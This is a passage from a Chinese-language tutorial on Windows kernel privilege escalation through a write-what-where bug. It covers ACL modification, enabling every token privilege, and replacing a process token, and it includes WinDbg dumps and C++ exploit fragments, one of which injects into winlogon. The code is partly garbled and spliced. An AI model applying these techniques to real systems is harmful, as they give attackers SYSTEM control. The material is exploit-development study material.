       +0x00f DeletedInline    : 0y0
       +0x010 ObjectCreateInfo : 0x8d2952c0 _OBJECT_CREATE_INFORMATION
       +0x010 QuotaBlockCharged : 0x8d2952c0 Void
       +0x014 SecurityDescriptor : 0xa7a779d2 Void  Where = (ULONG_PTR)dwTargetOffset;
        //std::cout What = (ULONG_PTR)&uAllPrivelage;
        // WWW->What = (ULONG)&dwRealExAllocatePool;
        // copy exp to target address
        std::cout Where What)  !analyze -v
    *******************************************************************************
    *                                                                             *
    *                        Bugcheck Analysis                                    *
    *                                                                             *
    *******************************************************************************
    BAD_OBJECT_HEADER (189)
    The OBJECT_HEADER has been corrupted
    Arguments:
    Arg1: 8d1d9028, Pointer to bad OBJECT_HEADER
    Arg2: 8639b480, Pointer to the resulting OBJECT_TYPE based on the TypeIndex in the OBJECT_HEADER
    Arg3: 00000001, The object security descriptor is invalid.
    Arg4: 00000000, Reserved.
    Debugging Details:
    ------------------    
非常遗憾，没有生效，上网检查了一下，发现其实是Win10给出的一种攻击的缓解手段。在Win10上，EPROCESS这个对象的`_OBJECT_HEADER`中指向DS的指针是不能为空的，否则就会报错，具体可以看[这里](https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-2)。这篇文章还介绍了一下如何绕过这个防护，继续利用dacl进行攻击。利用的思路就是修改成了：通过修改winlogon.exe中的AECs（访问控制实体），让其进程允许来自任意SID
token 的用户修改，然后再进行inject即可。具体可参考链接里面给出的方法，这边就不演示了。
###  方法二：TOKEN结构体
前面介绍了ACL的攻击方式，那么这次我们回到TOKEN上面，介绍一下修改token的攻击。之前我们提到说，想要提权，其实就是修改这个TOKEN结构体的成员变量。这个结构体在WIN10中结构如下:
    1: kd> dt nt!_TOKEN
       +0x000 TokenSource      : _TOKEN_SOURCE
       +0x010 TokenId          : _LUID
       +0x018 AuthenticationId : _LUID
       +0x020 ParentTokenId    : _LUID
       +0x028 ExpirationTime   : _LARGE_INTEGER
       +0x030 TokenLock        : Ptr32 _ERESOURCE
       +0x034 ModifiedId       : _LUID
       +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
       +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
       +0x078 SessionId        : Uint4B
       +0x07c UserAndGroupCount : Uint4B
       +0x080 RestrictedSidCount : Uint4B
       +0x084 VariableLength   : Uint4B
       +0x088 DynamicCharged   : Uint4B
       +0x08c DynamicAvailable : Uint4B
       +0x090 DefaultOwnerIndex : Uint4B
       +0x094 UserAndGroups    : Ptr32 _SID_AND_ATTRIBUTES
       +0x098 RestrictedSids   : Ptr32 _SID_AND_ATTRIBUTES
       +0x09c PrimaryGroup     : Ptr32 Void
       +0x0a0 DynamicPart      : Ptr32 Uint4B
       +0x0a4 DefaultDacl      : Ptr32 _ACL
       +0x0a8 TokenType        : _TOKEN_TYPE
       +0x0ac ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL
       +0x0b0 TokenFlags       : Uint4B
       +0x0b4 TokenInUse       : UChar
       +0x0b8 IntegrityLevelIndex : Uint4B
       +0x0bc MandatoryPolicy  : Uint4B
       +0x0c0 LogonSession     : Ptr32 _SEP_LOGON_SESSION_REFERENCES
       +0x0c4 OriginatingLogonSession : _LUID
       +0x0cc SidHash          : _SID_AND_ATTRIBUTES_HASH
       +0x154 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
       +0x1dc pSecurityAttributes : Ptr32 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
       +0x1e0 Package          : Ptr32 Void
       +0x1e4 Capabilities     : Ptr32 _SID_AND_ATTRIBUTES
       +0x1e8 CapabilityCount  : Uint4B
       +0x1ec CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
       +0x274 LowboxNumberEntry : Ptr32 _SEP_LOWBOX_NUMBER_ENTRY
       +0x278 LowboxHandlesEntry : Ptr32 _SEP_CACHED_HANDLES_ENTRY
       +0x27c pClaimAttributes : Ptr32 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION
       +0x280 TrustLevelSid    : Ptr32 Void
       +0x284 TrustLinkedToken : Ptr32 _TOKEN
       +0x288 IntegrityLevelSidValue : Ptr32 Void
       +0x28c TokenSidValues   : Ptr32 _SEP_SID_VALUES_BLOCK
       +0x290 IndexEntry       : Ptr32 _SEP_LUID_TO_INDEX_MAP_ENTRY
       +0x294 DiagnosticInfo   : Ptr32 _SEP_TOKEN_DIAG_TRACK_ENTRY
       +0x298 BnoIsolationHandlesEntry : Ptr32 _SEP_CACHED_HANDLES_ENTRY
       +0x29c SessionObject    : Ptr32 Void
       +0x2a0 VariablePart     : Uint4B
这其中最关键的就是
       +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
这个位置记录了当前进程的特权。特权的结构如下:
    nt!_SEP_TOKEN_PRIVILEGES
       +0x000 Present          : Uint8B
       +0x008 Enabled          : Uint8B
       +0x010 EnabledByDefault : Uint8B
Windows运行过程中，实际上是检查了`Enabled`这个位置的特权。换句话说，如果这个位置的特权都打开了，那么当前进程将会获得所有类型的特权。这里给出一个大概的例子:
        // New Method
        HANDLE hCurrentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
        if (!hCurrentProcess) {
            std::cout Where = (ULONG_PTR)dwTargetOffset;
        //std::cout What = (ULONG_PTR)&uAllPrivelage;
        // Call the WWW vulnerability to write the target address
        Vunelrable(WWW);
        // now because the dacl has been changed, we guess this process may could be inject
        // Tro to inject code
        InjectToWinlogon();
###  方法三：替换TOKEN
这个方法其实是目前最为广泛使用的方法，也就是比较简单的替换到EPROCESS中的这个地方:
    0: kd> dt nt!_EPROCESS
    //....
       +0x0d8 ProcessQuotaUsage : [2] Uint4B
       +0x0e0 ProcessQuotaPeak : [2] Uint4B
       +0x0e8 PeakVirtualSize  : Uint4B
       +0x0ec VirtualSize      : Uint4B
       +0x0f0 SessionProcessLinks : _LIST_ENTRY
       +0x0f8 ExceptionPortData : Ptr32 Void
       +0x0f8 ExceptionPortValue : Uint4B
       +0x0f8 ExceptionPortState : Pos 0, 3 Bits
       +0x0fc Token            : _EX_FAST_REF  dt _Object_header 8bfd1888
    nt!_OBJECT_HEADER
       +0x000 PointerCount     : 0n33
       +0x004 HandleCount      : 0n2
参考的文章中提供了一种比较常见的利用思路
  * 通过hook `NtOpenThreadToken()`，然后调用`MsiInstallProduct()`API（需要中级的权限）来截获SystemToken
  * 当我们有多次写的能力的时候，我们需要首先将`TOKEN-0x18`(也就是PointerCount)数量+1，之后再修改当前进程token为这个token
  * 如果只有单次写能力的时候，首先选择一个不太可能结束的进程（例如system），修改完当前进程的token之后，马上从这个不太可能结束的进程中复制两个token的句柄。
## 参考链接